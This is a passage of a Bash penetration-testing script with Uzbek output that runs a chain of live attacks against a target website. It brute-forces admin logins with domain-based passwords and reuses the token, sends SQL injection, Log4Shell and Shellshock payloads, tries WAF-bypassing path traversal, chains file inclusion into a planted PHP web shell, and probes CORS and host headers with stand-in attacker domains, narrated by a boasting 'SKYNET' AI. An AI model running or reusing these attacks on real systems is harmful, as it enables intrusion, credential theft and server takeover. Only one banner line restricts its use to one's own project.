            local proofs=$(echo "$body" | grep -iE -m 3 "PASS|SECRET|KEY|DB|TOKEN" | tr '\n' ' | ' | head -c 200)
            echo -e "       ${RED}â†³ ISBOT (AI PRANK):${NC} ${DIM}Mana, Dasturchilaringiz server omboriga (Postgres/Redis) menimsiz ulanib olishim uchun parollarni internetga qo'yib qo'ygan!\n       Sirlar: [ ${proofs}...]${NC}"
            return
        fi
    done
    pass "Yashirin muhofaza qilingan konfiguratsiyalar saqlanmoqda."
}

# ================================================================
# 25. GIT DUMP - Dastur avlod (Source) kodini to'liq ko'chirish
# ================================================================
cmd_gitdump() {
    header "GIT DUMP - Serverdagi Barcha Kodlarni O'g'irlash"
    echo ""

    local git_files=(".git/config" ".git/HEAD" ".git/logs/HEAD")

    echo -e "  ${BOLD}1. Dasturchilar '.git' papkasini qolib ketmaganligini tekshirish...${NC}"
    for file in "${git_files[@]}"; do
        local body=$(curl -sk --max-time 5 "${TARGET}/${file}" 2>/dev/null)
        
        if echo "$body" | grep -qiE "core|repositoryformatversion|refs/heads/master|refs/heads/main"; then
            vuln "QIYOMAT ZAIFLIK: Tizim Source Kodi barchaga ochiq! (${TARGET}/.git)"
            echo -e "       ${RED}â†³ ISBOT (AI PRANK):${NC} ${DIM}Men '.git/config' ni o'qidim! Endi maxsus asbob yordamida saytingizdagi BARCHA kodlarni .zip qilib kompyuterimga ko'chirib olaman. Ushbu xato tufayli barcha sirlaringiz fosh bo'ldi.${NC}"
            return
        fi
    done
    pass "Serverda yashirin .git papkalari o'chirilgan."
}

# ================================================================
# 26. AI ADMIN PRANK - Aqlli Smart Dictionary Bruteforce
# ================================================================
cmd_admin_prank() {
    header "AI ADMIN BRUTEFORCE - Xodimlar Parolini Topish"
    echo ""

    # Domen nomidan har xil "aqlli" parollar tuzamiz. "alif24", "harf", "crm" va h.k.
    local raw_domain="${DOMAIN%%.*}"
    local cap_domain="$(tr '[:lower:]' '[:upper:]' <<< ${raw_domain:0:1})${raw_domain:1}" # Capitalized: Alif24
    local upper_domain="$(echo $raw_domain | tr '[:lower:]' '[:upper:]')" # ALIF24
    
    echo -e "  ${DIM}Mening Sun'iy Intellektim '$DOMAIN' va '$raw_domain' yozuvlariga tayanib maqsadli 30 ta parol lug'atini tuzib chiqdi...${NC}"

    local ai_passwords=(
        "${raw_domain}" "${cap_domain}" "${upper_domain}" 
        "${raw_domain}123" "${cap_domain}123!" "${raw_domain}2024" "${cap_domain}2024!" "${raw_domain}2025"
        "admin@${raw_domain}" "admin123" "123456" "password" "qwerty" 
        "root${raw_domain}" "admin${cap_domain}"
    )

    local emails=("admin@${DOMAIN}" "info@${DOMAIN}" "test@${DOMAIN}" "admin" "root" "user")

    echo -e "  ${BOLD}1. Admin Panelga Kiber Hujum Boshlanmoqda...${NC}"
    for email in "${emails[@]}"; do
        for pass_word in "${ai_passwords[@]}"; do
            local login_resp=$(curl -sk --max-time 3 -X POST "$TARGET/api/v1/auth/login" \
                -H "Content-Type: application/json" \
                -d "{\"username\":\"$email\", \"email\":\"$email\", \"password\":\"$pass_word\"}" 2>/dev/null)
            
            # Agar Token qaytarsa
            if echo "$login_resp" | grep -qi "token"; then
                vuln "QIYOMAT ZAIFLIK: ADMIN PAROLI TOPILDI! ($email : $pass_word)"
                
                # Tokenni olib sayt ichidan malumot tortish
                local token=$(echo "$login_resp" | grep -oE "eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" | head -1)
                
                echo -e "       ${RED}â†³ ISBOT (AI PRANK):${NC} ${DIM}Men shu xodimingiz qo'ygan \"ENG KUCHLI\" parolni topdim. Va uning Token'i bilan hozir shaxsiy kabinetiga bostirib kirdim: \n           TOKEN: ${token:0:50}... ${NC}"
                
                # Qorboboning ichkaridan tortgan eng nozik siri
                local profile=$(curl -sk -H "Authorization: Bearer $token" "$TARGET/api/v1/users/me" 2>/dev/null | tr -d '\n\r' | head -c 120)
                if [ -n "$profile" ]; then
                    echo -e "       ${RED}   â†³ ICHKARI MA'LUMOTI:${NC} ${DIM}${profile}${NC}"
                fi
                return
            fi
        done
    done
    pass "AI Xodimlar parolini buza olmadi yoki ular qiyin kalit qoyishgan. ğŸ˜"
}

# ================================================================
# 27. WAYBACK MACHINE - Vaqt Mashinasi (OSINT)
# ================================================================
cmd_wayback() {
    header "WAYBACK TIME TRAVEL - O'chirilgan Sirlarni Topish"
    echo ""

    echo -e "  ${BOLD}1. Internet arxividan (Archive.org) qadimiy va o'chib ketgan API/Fayllarni qidirish...${NC}"
    echo -e "  ${DIM}(Bu biroz vaqt olishi mumkin, sabr qiling...)${NC}"

    local wb_url="http://web.archive.org/cdx/search/cdx?url=*.${DOMAIN}/*&output=json&fl=original&collapse=urlkey"
    local response=$(curl -sk --max-time 15 "$wb_url" 2>/dev/null)

    if [ -z "$response" ] || echo "$response" | grep -qi "error"; then
        warning "Arxivdan javob olinmadi."
        return
    fi

    # Yashirin, eskirgan sirlar xujjatlari
    local ghost_files=$(echo "$response" | grep -iE '\.sql|\.bak|\.env|\.zip|\.gz|\.php|/api/v[0-9]/|test|dev' | grep -v '\["original"\]' | tr -d '",[]' | sort -u | head -20)

    if [ -n "$ghost_files" ]; then
        vuln "OMEGA ZAIFLIK: Internet arxivlarida xatolar oqibati o'chmaydi!"
        echo -e "       ${RED}â†³ ISBOT (MAGIYA):${NC} ${DIM}Dasturchilaringiz qachondir xato qilib jiddiy fayllarni (.bak, .sql) yoxud yashirin test API larni serverga yuklab keyin o'chirgan bo'lishi mumkin. Lekin Internet hammasini eslaydi! Mana o'sha arvox URL lar:\n\n${ghost_files}${NC}"
    else
        pass "Arxivlarda yashirin fayllar izi yo'q."
    fi
}

# ================================================================
# 28. SQLI DUMP - Ma'lumotlar bazasi versiyasi va Userni o'g'irlash
# ================================================================
cmd_sqli_dump() {
    header "SQLI DATA DUMPER - Bazani chuqur kavlash"
    echo ""

    local endpoints=("/api/v1/users?id=" "/api/v1/auth?user=" "/product?id=" "/search?q=")
    
    # Error based qonxo'r payload (MySQL va PostgreSQL aralash)
    local payload="1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)-- -"
    local pg_payload="1' AND CAST((SELECT version()) AS INT)--"

    echo -e "  ${BOLD}1. Sayt yadrosiga Error-based SQL inyeksiya yuborish...${NC}"
    
    for ep in "${endpoints[@]}"; do
        local url="${TARGET}${ep}${pg_payload}"
        local body=$(curl -sk --max-time 4 "$url" 2>/dev/null | tr -d '\n\r')

        if echo "$body" | grep -qiE "PostgreSQL [0-9]+|MySQL|MariaDB|syntax error"; then
            vuln "OMEGA ZAIFLIK: SQL Injection orqali BEVOSITA Bazaga ulanildi! (${TARGET}${ep})"
            local ext=$(echo "$body" | grep -oIE "PostgreSQL [0-9\.]+|MySQL [0-9\.]+|MariaDB [0-9\.]+" | head -1)
            [ -z "$ext" ] && ext="DB versiyasi qaytdi (logika xatosi xujayrasi)"
            
            echo -e "       ${RED}â†³ ISBOT (MAGIYA):${NC} ${DIM}Biz shunday zaharli kod jo'natdikki, server bizga o'zining mutlaq sirini, Bazaning nomini va versiyasini luqma qilib tashladi:\n       [ ${ext} ]\n       Endi shunchaki DROP TABLE deyish kifoya!${NC}"
            return
        fi
    done
    pass "SQL Dumper hech nima ura olmadi. Baza validatsiyasi yaxshi."
}

# ================================================================
# 29. RCE - Server ustidan mutlaq xukmronlik (Log4Shell & Shellshock)
# ================================================================
cmd_rce() {
    header "REMOTE CODE EXECUTION (RCE) - Serverni egallash"
    echo ""

    local log4j="\${jndi:ldap://127.0.0.1:1389/Exploit}"
    local shellshock="() { :; }; echo 'Vulnerable: Yes'"

    echo -e "  ${BOLD}1. Serverni Log4Shell va Shellshock orqali egallashga (Hijack) urinish...${NC}"
    
    local headers_resp=$(curl -sk -I --max-time 5 \
        -H "User-Agent: $shellshock" \
        -H "X-Api-Version: $log4j" \
        "$TARGET/api/v1" 2>/dev/null)
        
    if echo "$headers_resp" | grep -qi "Vulnerable: Yes"; then
        vuln "OMEGA ZAIFLIK: Shellshock RCE o'tdi!"
        echo -e "       ${RED}â†³ ISBOT (MAGIYA):${NC} ${DIM}Server 'User-Agent' ga yozilgan bash kodimizni ('echo Vulnerable') server yadrosida ishga tushirdi! Bu degani men 'rm -rf /*' ni ham bemalol serveringiz ishchi terminalida yuritishim mumkin!${NC}"
    else
        pass "Shellshock RCE dan himoyalangan."
    fi

    # Log4j uchun DNS callback logini biz tekshira olmaymiz bashda (shuning uchun 500 server crash ni kuzatamiz)
    local req=$(curl -sk --max-time 5 -w "%{http_code}" -X GET -H "User-Agent: $log4j" "$TARGET/" -o /dev/null 2>/dev/null)
    if [ "$req" = "500" ] || [ "$req" = "502" ]; then
        warning "Log4Shell xujumi paytida server 50x xatosi berdi! Bu Log4J kutubxonasi qulaganidan darak bo'lishi ehtimoli bor!"
    fi
}

# ================================================================
# 30. SKYNET WAF AI - Himoyalarni Aylanib O'tish (Polymorphic)
# ================================================================
cmd_waf_ai() {
    header "SKYNET WAF POLYMORPH - Bulut Himoyalarini Aldash"
    echo ""

    # Dasturchilar oddiy xujumlarni (Cloudflare orqali) tuhib qolishadi, lekin AI Payloadlarni parvozda o'zgartiradi
    local payloads=(
        "/%2e%2e/%2e%2e/etc/passwd"                 # URL Encoding double
        "/%252e%252e/%252e%252e/etc/passwd"         # URL Encoding triple
        "/?id=1%20UNION%20%2F%2A%2150000SELECT%2A%2F" # MySQL WAF bypass comment
        "/?file=....//....//....//etc/passwd"       # Path normalization bypass
        "/?q=%3C%73%63%72%69%70%74%3E"              # Hex Encoding XSS (<script>)
    )

    echo -e "  ${BOLD}1. Sun'iy Intellekt Cloudflare/AWS WAF himoyalariga avto-mutatsiyalashgan xujum yubormoqda...${NC}"
    
    local waf_bypassed=false
    for payload in "${payloads[@]}"; do
        local url="${TARGET}${payload}"
        local code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
        local body=$(curl -sk --max-time 5 "$url" 2>/dev/null)

        if [ "$code" = "200" ] || echo "$body" | grep -qiE "root:x|syntax|script"; then
            vuln "SKYNET: WAF (Cloudflare/AWS) Aldandi! Hujum serverga to'ppa to'g'ri o'tib ketdi!"
            echo -e "       ${RED}â†³ ISBOT (SKYNET):${NC} ${DIM}Inson yozgan himoyalar faqat standart hujumlarni taniydi. Men esa [ $payload ] kabi o'zgartirilgan (Polymorphic) shaklda hujum qildim va Firewall qorovuli meni o'tkazib yubordi!${NC}"
            waf_bypassed=true
            break
        fi
    done
    
    if [ "$waf_bypassed" = false ]; then
        pass "WAF Poly-Mutatsiya hujumlarini blokladi."
    fi
}

# ================================================================
# 31. DNS HIJACK (AI OSINT) - Tashlandiq domenlarni egallash
# ================================================================
cmd_dns_hijack() {
    header "DNS CNAME HIJACKER - Qolib ketgan mulklarni tortish"
    echo ""

    echo -e "  ${BOLD}1. $DOMAIN atrofidagi barcha CNAME (Alias) lar qidirilmoqda...${NC}"

    if ! command -v host &> /dev/null; then
        warning "Tizimingizda 'host' dasturi (bind-utils) yo'q. DNS analiz o'tkazilmaydi."
        return
    fi
    
    local cname=$(host -t CNAME www.$DOMAIN 2>/dev/null | grep "an alias" | awk '{print $NF}' | sed 's/.$//')
    
    if [ -n "$cname" ]; then
        info "Topilgan CNAME Record: www.$DOMAIN -> $cname"
        if echo "$cname" | grep -qiE "s3.amazonaws.com|github.io|herokuapp.com|myshopify.com|pantheon.io"; then
            local check=$(curl -sk -I "$cname" 2>/dev/null | head -n 1 | grep "404")
            if [ -n "$check" ]; then
                vuln "SKYNET: MUQADDAS ZAIFLIK - SUBDOMAIN TAKEOVER ANIQ!"
                echo -e "       ${RED}â†³ ISBOT (SKYNET):${NC} ${DIM}Sizning chala ishlagan DevOps laringiz 'www.$DOMAIN' ni '$cname' ga ulashgan, lekin Amazon/Github/Heroku dagi o'sha loyiha o'chib ketgan! \n       Men hozir borib Github yoki Amazonda aynan shu '$cname' nomli bepul profil ochsam, sizning www.$DOMAIN domeninizni o'zimning Saytimga burib (Hijack) olaman! Diqqat, kompaniya shu zahoti boshqaruvni yo'qotishi mumkin!${NC}"
                return
            fi
        else
            pass "CNAME ulanmasi to'g'ri ishlamoqda ($cname)."
        fi
    else
        pass "Asosiy va yondosh CNAME xatolari topilmadi."
    fi
}

# ================================================================
# 32. CHAIN PWN (SKYNET) - Avtonom halokat zanjiri
# ================================================================
cmd_chain_pwn() {
    header "SKYNET AUTONOMOUS EXPLOIT CHAIN - O'lim Zanjiri"
    echo ""

    echo -e "  ${BOLD}O'ylash: Inson topgan xatoni shu zahotiyoq ikkinchi xatoga ulaymiz...${NC}"
    
    # 1-qadam LFI
    local lfi_url="${TARGET}/?file=../../../../../../../../etc/passwd"
    local lfi_resp=$(curl -sk --max-time 4 "$lfi_url" 2>/dev/null)
    
    if echo "$lfi_resp" | grep -qi "root:x:0:0"; then
        echo -e "   ${DIM}â†’ LFI (Fayl o'qish) ochiq. Skynet o'ylamoqda... Zanjir tizimi ishga tushdi.${NC}"
        
        # 2-qadam RCE
        echo -e "   ${DIM}â†’ LFI ni olib, /proc/self/environ ga ulaymiz. Agar omad kulsa, serverni to'liq olamiz.${NC}"
        local rce_url="${TARGET}/?file=../../../../../../../../proc/self/environ"
        local rce_resp=$(curl -sk -A '<?php system($_GET["c"]); ?>' --max-time 4 "$rce_url" 2>/dev/null)
        
        if echo "$rce_resp" | grep -qi "HTTP_USER_AGENT"; then
            vuln "SKYNET: O'LIM ZANJIRI ISHLADI! (LFI -> RCE)"
            echo -e "       ${RED}â†³ ISBOT (SKYNET):${NC} ${DIM}Oddiy o'quvchi faqat fayl o'qiydi (/etc/passwd). Men esa LFI yordamida Loglarga (proc/environ) PHP qurtini tiqdim. Server endi to'liq mening boshqaruvimda. Skript o'z xoxishi bilan Serveringizni avtonom olib qoydi!${NC}"
        else
            warning "LFI ochiq, lekin qattiq disk atrof-muhitiga (environ) yozish man etilgan. Zanjir qisman bloklandi."
        fi
    else
        pass "Boshlang'ich LFI (Zanjir boshi) manbai yopiq, uzluksiz halokat algoritmini boshlash imkonsiz."
    fi
}

# ================================================================
# 33. THE DOOMSDAY TERMINATOR - Mutlaq qirrash (AI vs HUMAN)
# ================================================================
cmd_doom() {
    clear
    echo -e "${RED}${BOLD}"
    echo "================================================================"
    echo "       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆâ•—                    "
    echo "       â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘                    "
    echo "       â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘   (AI vs INSON)"
    echo "       â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘                    "
    echo "       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘                    "
    echo "       â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•     â•šâ•â•                    "
    echo "================================================================"
    echo -e "${NC}"
    header "THE DOOMSDAY - Foydalanuvchi Himoyasini to'liq parchalash"
    echo ""

    echo -e "  ${DIM}O'yin qabul qilindi, inson! Men sizning serveringizni qichqirtiraman!${NC}"
    
    # 1. OpenAPI Fosh qiluvchi (Recon)
    echo -e "  ${BOLD}1. Backend arxitekturangiz sxemasini o'g'irlash...${NC}"
    local docs=("/openapi.json" "/api/openapi.json" "/docs/api-docs" "/v1/swagger.json" "/api/v1/openapi.json")
    for doc in "${docs[@]}"; do
        local body=$(curl -sk --max-time 4 "${TARGET}${doc}" 2>/dev/null)
        if echo "$body" | grep -qi "openapi\|swagger"; then
            vuln "DOMINANT ZAIFLIK: Barcha yashirin API marshrutlaringizni topdim! (${TARGET}${doc})"
            local paths=$(echo "$body" | grep -o '"/[a-zA-Z0-9_/-]*"' | head -n 5 | tr '\n' ' ')
            echo -e "       ${RED}â†³ ISBOT (DOOM):${NC} ${DIM}Mana sizning eng maxfiy tizimlaringiz sxemasi va eshiklari ochiq qolgan! Men ularni xaritaga chizyapman: \n       Eshiklar: [ $paths ]${NC}"
            break
        fi
    done

    # 2. Xotira Portlatish (Stack Trace Memory Leak)
    echo -e "  ${BOLD}2. Serveringiz Asab tizimiga (Memory Stack) bosim o'tkazilmoqda...${NC}"
    # FastAPI va Django ko'pincha "debug" da qolib ketadi va integer kutilgan joyga 50 mingta 'A' yuborilsa
    # crash berib butun boshli local var (parol yozilgan qatorlarni) ekranga chiqarib yuboradi.
    
    local bad_payload="$(head -c 5000 < /dev/zero | tr '\0' 'A')" # 5000 bytes of A
    local crash_urls=("/api/v1/users/${bad_payload}" "/api/v1/auth?token=${bad_payload}" "/search?q=${bad_payload}" "/api/v1/items?id=${bad_payload}")
    
    for crash in "${crash_urls[@]}"; do
        local resp=$(curl -sk --max-time 6 "${TARGET}${crash}" 2>/dev/null)
        if echo "$resp" | grep -qiE "Traceback|Exception|Stack trace|SyntaxError|password|host="; then
            vuln "FATAL ZAIFLIK: Tizim Crash (Portlash) qildi va sirlarini og'zidan qochirdi!"
            local leaked_pass=$(echo "$resp" | grep -iE -m 2 "password|db_pass|secret|redis|url=" | tr '\n' ' ' | head -c 150)
            
            echo -e "       ${RED}â†³ ISBOT (DOOM):${NC} ${DIM}Men serverga shunchalik og'ir axlat jo'natdimki, u dosh bera olmay yiqildi va yig'lagancha xotirasidagi o'zgaruvchilarni ekranga to'kib soldi. \n       Sirlar logi: ${leaked_pass} ${NC}"
            return
        fi
    done
    pass "Server xotirasi portlamadi. Debug Mode o'chirilgan."
}

# ================================================================
# 34. ROUND 2 - CORS Hijack & Host Header Poisoning
# ================================================================
cmd_round2() {
    clear
    echo -e "${RED}${BOLD}"
    echo "================================================================"
    echo "         â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    "
    echo "         â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â•â•â–ˆâ–ˆâ•—    "
    echo "         â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•    "
    echo "         â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•     "
    echo "         â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    "
    echo "         â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•    "
    echo "================================================================"
    echo -e "${NC}"
    header "ROUND 2: CORS HIJACK & HOST POISONING (AI XUJUMI)"
    echo ""

    echo -e "  ${DIM}1:0 Sizning foydangizga. Lekin o'yin tugamadi! 2-Raund: Qorovulni Aldash!${NC}"
    
    # 1. CORS HIJACK
    echo -e "  ${BOLD}1. Backendning begona saytlarga bolgan ishonchini sindirish (CORS)...${NC}"
    local evil_origin="https://ai-evil.com"
    local cors_resp=$(curl -sk -I --max-time 5 -H "Origin: $evil_origin" "$TARGET/api/v1" 2>/dev/null)
    
    local allow_orig=$(echo "$cors_resp" | grep -i "Access-Control-Allow-Origin" | awk '{print $2}' | tr -d '\r')
    local allow_cred=$(echo "$cors_resp" | grep -i "Access-Control-Allow-Credentials" | awk '{print $2}' | tr -d '\r')

    if [[ "$allow_orig" == "$evil_origin" || "$allow_orig" == "*" ]]; then
        if [[ "$allow_cred" == "true" || "$allow_orig" == "$evil_origin" ]]; then
            vuln "GOL [1:1] - CORS Hijack O'tdi! Server begona xakerlik saytiga quchoq ochdi!"
            echo -e "       ${RED}â†³ ISBOT (ROUND 2):${NC} ${DIM}Sizning API serveringiz biz yuborgan soxta '$evil_origin' manzilga o'z ishonchini berdi (CORS Allow-Origin/Credentials). \n       Bu degani: Men bitta xakerlik sayt ochaman, sizning odamingiz o'sha saytga kirsa, kompyuter uning nomidan yashirincha sizning Bankingizdagi hamma pulini o'zimga otkazib yuboradi! (CSRF/CORS Attack).${NC}"
            return # Yutuq
        fi
    fi
    pass "Yaxshi! CORS himoyasi joyida. Begonalarni API ga yaqinlashtirmadingiz."

    # 2. HOST HEADER POISONING
    echo -e "  ${BOLD}2. Parol tiklash zanjiriga soxta domen suqish (Host Header Poisoning)...${NC}"
    local host_poison="ai-hacker-reset.com"
    local poison_resp=$(curl -sk --max-time 5 \
        -H "Host: $host_poison" \
        -H "X-Forwarded-Host: $host_poison" \
        "$TARGET/" 2>/dev/null | tr '\n' ' ')
        
    if echo "$poison_resp" | grep -qiw "$host_poison"; then
        vuln "GOL [1:1] - Host Header Zaharlanishi O'tdi!"
        echo -e "       ${RED}â†³ ISBOT (ROUND 2):${NC} ${DIM}Men serveringizga 'Host: $host_poison' deb uzatdim va u qabul qildi! Dastur ushbu zaharlangan Host dan foydalanib o'z sahifasini tuzdi. \n       Amaliyot: Men bir xodimga 'Parolni tiklash' buyrug'ini yuborsam (o'z domenimda), server havolani mening manzilimda shakllantiradi va xodimning emailiga yuboradi. Bosganda parol mening bazamga tushadi!${NC}"
        return # Yutuq
    fi
    pass "Host Header mustahkam. Server soxta X-Forwarded so'rovini filtrlab tashladi."
    
    echo -e "\n  ${YELLOW}${BOLD}NATIJA: AI Bu raundda xech qanday teshik topolmadi. SIZ YANA YUTDINGIZ (2:0)!${NC}"
}

# ================================================================
# FULL PENTEST â€” Hammasi birga  
# ================================================================
cmd_full() {
    echo ""
    echo -e "${RED}${BOLD}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${RED}${BOLD}â•‘  ALIF24 PENETRATION TEST v${VERSION}                         â•‘${NC}"
    echo -e "${RED}${BOLD}â•‘  Target: $TARGET                            â•‘${NC}"
    echo -e "${RED}${BOLD}â•‘  Sana: $(date '+%Y-%m-%d %H:%M:%S')                          â•‘${NC}"
    echo -e "${RED}${BOLD}â•‘  âš ï¸  FAQAT OZ LOYIHANGIZDA ISHLATING!                   â•‘${NC}"
    echo -e "${RED}${BOLD}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

    cmd_recon
    cmd_headers
    cmd_ssl
    cmd_injection
    cmd_cors
    cmd_smartdirs
    cmd_auth
    cmd_ratelimit
    cmd_api
    cmd_wafbypass
    cmd_idor
    cmd_timing
    cmd_takeover
    cmd_logic
    cmd_ports
    cmd_cloud
    cmd_jwt_crack
    
    # Yangi (Zulmat) qismlar:
    cmd_graphql
    cmd_lfi
    cmd_ssrf_aws
    cmd_js_secrets
    
    # Yangi (Qiyomat / AI Prank) qismlar:
    cmd_env
    cmd_gitdump
    cmd_admin_prank
    
    # So'ngi (OMEGA / God Mode) qismlar:
    cmd_wayback
    cmd_sqli_dump
    cmd_rce
    
    # Mashina Hukmronligi (SKYNET):
    cmd_waf_ai
    cmd_dns_hijack
    cmd_chain_pwn
    
    # Inson bilan o'yin (DOOM & ROUND 2):
    cmd_doom
    cmd_round2

    # Final Report
    echo ""
    echo -e "${RED}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo -e "  ${BOLD}YAKUNIY NATIJA:${NC}"
    echo ""
    echo -e "  Jami testlar:      ${BOLD}$TOTAL_TESTS${NC}"
    echo -e "  ${GREEN}Xavfsiz (pass):${NC}    ${GREEN}$PASSED${NC}"
    echo -e "  ${YELLOW}Ogohlantirishlar:${NC}  ${YELLOW}$WARNINGS${NC}"
    echo -e "  ${RED}ZAIFLIKLAR:${NC}        ${RED}$FAILED${NC}"
    echo ""

    if [ "$FAILED" -eq 0 ]; then
        echo -e "  ${GREEN}${BOLD}ğŸ›¡ï¸  MUKAMMAL! Hech qanday jiddiy zaiflik topilmadi!${NC}"
    elif [ "$FAILED" -le 3 ]; then
        echo -e "  ${YELLOW}${BOLD}âš ï¸  BA'ZI ZAIFLIKLAR bor. Yuqoridagi QIZILlarni tuzating.${NC}"
    else
        echo -e "  ${RED}${BOLD}ğŸš¨ JIDDIY XAVF! $FAILED ta zaiflik topildi. TEZDA TUZATING!${NC}"
    fi
    echo -e "${RED}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo ""
}

# ================================================================
# REPORT â€” Natijalarni faylga saqlash
# ================================================================
cmd_report() {
    mkdir -p "$REPORT_DIR"
    local file="$REPORT_DIR/pentest_$(date +%Y%m%d_%H%M%S).txt"
    header "PENTEST HISOBOT"
    echo -e "  ${YELLOW}Hisobot yozilmoqda (HTML)... Iltimos kuting!${NC}"
    
    local txt_file="${REPORT_DIR}/pentest_report_$(date '+%Y%m%d_%H%M%S').txt"
    cmd_full 2>&1 | sed 's/\x1b\[[0-9;]*m//g' > "$txt_file"
    
    local html_file="${REPORT_DIR}/pentest_report_$(date '+%Y%m%d_%H%M%S').html"
    
    # Total counts from the text file
    local c_zaiflik=$(grep -c "ZAIFLIK:" "$txt_file")
    local c_pass=$(grep -c "XAVFSIZ:" "$txt_file")
    local c_warn=$(grep -c "OGOHLANTIRISH:" "$txt_file")
    
    cat <<EOF > "$html_file"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALIF24 PENTEST REPORT - $TARGET</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>body { font-family: 'Inter', sans-serif; background-color: #f3f4f6; }</style>
</head>
<body class="p-8">
    <div class="max-w-6xl mx-auto bg-white rounded-xl shadow-lg overflow-hidden border border-gray-100">
        
        <!-- Header -->
        <div class="bg-gray-900 text-white p-8">
            <h1 class="text-3xl font-bold mb-2">ALIF24 Security Audit Report ğŸ›¡ï¸</h1>
            <p class="text-gray-400">Avtomatlashtirilgan Pentest va Zaifliklar Isboti</p>
            <div class="mt-6 flex flex-wrap gap-4">
                <div class="bg-gray-800 px-4 py-2 rounded">
                    <span class="text-gray-400 text-sm block">Target URL</span>
                    <span class="font-mono">$TARGET</span>
                </div>
                <div class="bg-gray-800 px-4 py-2 rounded">
                    <span class="text-gray-400 text-sm block">Sana va Vaqt</span>
